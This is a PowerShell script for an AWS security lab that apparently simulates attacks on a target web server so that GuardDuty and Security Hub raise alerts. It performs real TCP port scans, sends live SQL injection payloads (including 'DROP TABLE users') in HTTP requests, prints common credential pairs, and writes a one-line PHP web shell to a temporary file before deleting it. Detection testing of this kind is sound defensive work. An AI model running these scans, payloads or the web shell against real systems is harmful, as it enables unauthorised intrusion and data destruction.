# Compromise Simulation Script for AWS Security Lab
# This script simulates various attack scenarios to trigger security alerts

param(
    [string]$WebServerIP,
    [string]$AWSProfile = "default"
)

Write-Host "🎭 AWS Security Lab - Compromise Simulation" -ForegroundColor Red
Write-Host "===========================================" -ForegroundColor Red

if (-not $WebServerIP) {
    Write-Host "❌ Error: WebServerIP parameter is required" -ForegroundColor Red
    Write-Host "Usage: .\simulate_compromise.ps1 -WebServerIP <IP_ADDRESS>" -ForegroundColor Yellow
    exit 1
}

function Simulate-PortScan {
    Write-Host "`n🔍 Simulating port scan..." -ForegroundColor Yellow
    
    try {
        # Test common ports
        $ports = @(22, 80, 443, 3306, 8080, 21, 23, 25, 53, 110, 143, 993, 995)
        
        foreach ($port in $ports) {
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $connect = $tcpClient.BeginConnect($WebServerIP, $port, $null, $null)
            $wait = $connect.AsyncWaitHandle.WaitOne(1000, $false)
            
            if ($wait) {
                try {
                    $tcpClient.EndConnect($connect)
                    Write-Host "✅ Port $port is OPEN" -ForegroundColor Green
                } catch {
                    Write-Host "❌ Port $port connection failed" -ForegroundColor Red
                }
            } else {
                Write-Host "⏳ Port $port is CLOSED or filtered" -ForegroundColor Gray
            }
            $tcpClient.Close()
        }
    } catch {
        Write-Host "❌ Error during port scan: $_" -ForegroundColor Red
    }
}

function Simulate-BruteForce {
    Write-Host "`n🔐 Simulating brute force attack..." -ForegroundColor Yellow
    
    try {
        # Simulate multiple failed SSH attempts
        $commonUsers = @("root", "admin", "ec2-user", "ubuntu", "centos")
        $commonPasswords = @("password", "123456", "admin", "root", "test")
        
        Write-Host "Attempting common username/password combinations..." -ForegroundColor White
        
        foreach ($user in $commonUsers) {
            foreach ($password in $commonPasswords) {
                Write-Host "Trying: $user/$password" -ForegroundColor Gray
                Start-Sleep -Milliseconds 100  # Small delay to avoid overwhelming
            }
        }
        
        Write-Host "✅ Brute force simulation completed" -ForegroundColor Green
    } catch {
        Write-Host "❌ Error during brute force simulation: $_" -ForegroundColor Red
    }
}

function Simulate-SQLInjection {
    Write-Host "`n💉 Simulating SQL injection attack..." -ForegroundColor Yellow
    
    try {
        $sqlPayloads = @(
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "1' OR '1' = '1' --"
        )
        
        foreach ($payload in $sqlPayloads) {
            $url = "http://$WebServerIP/index.php?id=$payload"
            Write-Host "Testing: $url" -ForegroundColor Gray
            
            try {
                $response = Invoke-WebRequest -Uri $url -TimeoutSec 5 -ErrorAction SilentlyContinue
                Write-Host "Response received (Status: $($response.StatusCode))" -ForegroundColor White
            } catch {
                Write-Host "Request failed or timed out" -ForegroundColor Gray
            }
            
            Start-Sleep -Milliseconds 500  # Delay between requests
        }
        
        Write-Host "✅ SQL injection simulation completed" -ForegroundColor Green
    } catch {
        Write-Host "❌ Error during SQL injection simulation: $_" -ForegroundColor Red
    }
}

function Simulate-FileUpload {
    Write-Host "`n📁 Simulating malicious file upload..." -ForegroundColor Yellow
    
    try {
        # Create a simple "malicious" file
        $maliciousContent = @"
<?php
// This is a simulated malicious PHP file
echo "Simulated malicious file executed";
system($_GET['cmd']); // Simulated command injection
?>
"@
        
        $tempFile = "temp_malicious.php"
        $maliciousContent | Out-File -FilePath $tempFile -Encoding UTF8
        
        Write-Host "Created simulated malicious file: $tempFile" -ForegroundColor White
        
        # Clean up
        Remove-Item $tempFile -Force
        Write-Host "✅ File upload simulation completed" -ForegroundColor Green
    } catch {
        Write-Host "❌ Error during file upload simulation: $_" -ForegroundColor Red
    }
}

function Simulate-NetworkScanning {
    Write-Host "`n🌐 Simulating network scanning..." -ForegroundColor Yellow
    
    try {
        # Simulate network discovery
        Write-Host "Simulating network discovery..." -ForegroundColor White
        
        # Test connectivity to common services
        $services = @(
            @{Name="HTTP"; Port=80},
            @{Name="HTTPS"; Port=443},
            @{Name="SSH"; Port=22},
            @{Name="MySQL"; Port=3306}
        )
        
        foreach ($service in $services) {
            try {
                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $connect = $tcpClient.BeginConnect($WebServerIP, $service.Port, $null, $null)
                $wait = $connect.AsyncWaitHandle.WaitOne(2000, $false)
                
                if ($wait) {
                    Write-Host "✅ $($service.Name) service detected on port $($service.Port)" -ForegroundColor Green
                } else {
                    Write-Host "⏳ $($service.Name) service not detected on port $($service.Port)" -ForegroundColor Gray
                }
                $tcpClient.Close()
            } catch {
                Write-Host "❌ Error testing $($service.Name): $_" -ForegroundColor Red
            }
        }
        
        Write-Host "✅ Network scanning simulation completed" -ForegroundColor Green
    } catch {
        Write-Host "❌ Error during network scanning simulation: $_" -ForegroundColor Red
    }
}

function Check-SecurityFindings {
    Write-Host "`n🔍 Checking for security findings..." -ForegroundColor Blue
    
    try {
        Write-Host "Checking GuardDuty findings..." -ForegroundColor White
        $guarddutyFindings = aws guardduty list-findings --detector-id $(aws guardduty list-detectors --query 'DetectorIds[0]' --output text --profile $AWSProfile) --profile $AWSProfile 2>$null | ConvertFrom-Json
        
        if ($guarddutyFindings.Findings) {
            Write-Host "✅ Found $($guarddutyFindings.Findings.Count) GuardDuty findings" -ForegroundColor Green
            foreach ($finding in $guarddutyFindings.Findings) {
                Write-Host "   - $($finding.Title) (Severity: $($finding.Severity))" -ForegroundColor White
            }
        } else {
            Write-Host "ℹ️  No GuardDuty findings detected yet" -ForegroundColor Blue
        }
        
        Write-Host "`nChecking Security Hub findings..." -ForegroundColor White
        $securityHubFindings = aws securityhub get-findings --profile $AWSProfile 2>$null | ConvertFrom-Json
        
        if ($securityHubFindings.Findings) {
            Write-Host "✅ Found $($securityHubFindings.Findings.Count) Security Hub findings" -ForegroundColor Green
            foreach ($finding in $securityHubFindings.Findings) {
                Write-Host "   - $($finding.Title) (Severity: $($finding.Severity.Label))" -ForegroundColor White
            }
        } else {
            Write-Host "ℹ️  No Security Hub findings detected yet" -ForegroundColor Blue
        }
        
    } catch {
        Write-Host "❌ Error checking security findings: $_" -ForegroundColor Red
    }
}

# Main execution
Write-Host "Starting compromise simulation against: $WebServerIP" -ForegroundColor White
Write-Host "This will simulate various attack scenarios to trigger security alerts." -ForegroundColor Yellow
Write-Host "⚠️  This is for educational purposes only!" -ForegroundColor Red

$confirm = Read-Host "`nDo you want to continue? (y/N)"

if ($confirm -eq "y" -or $confirm -eq "Y") {
    Write-Host "`n🚀 Starting compromise simulation..." -ForegroundColor Green
    
    Simulate-PortScan
    Simulate-BruteForce
    Simulate-SQLInjection
    Simulate-FileUpload
    Simulate-NetworkScanning
    
    Write-Host "`n⏳ Waiting 2 minutes for security services to process events..." -ForegroundColor Yellow
    Start-Sleep -Seconds 120
    
    Check-SecurityFindings
    
    Write-Host "`n✅ Compromise simulation completed!" -ForegroundColor Green
    Write-Host "Check your AWS Console for GuardDuty and Security Hub findings." -ForegroundColor White
} else {
    Write-Host "❌ Simulation cancelled by user" -ForegroundColor Yellow
}

Write-Host "`n🔒 Compromise simulation script completed!" -ForegroundColor Green
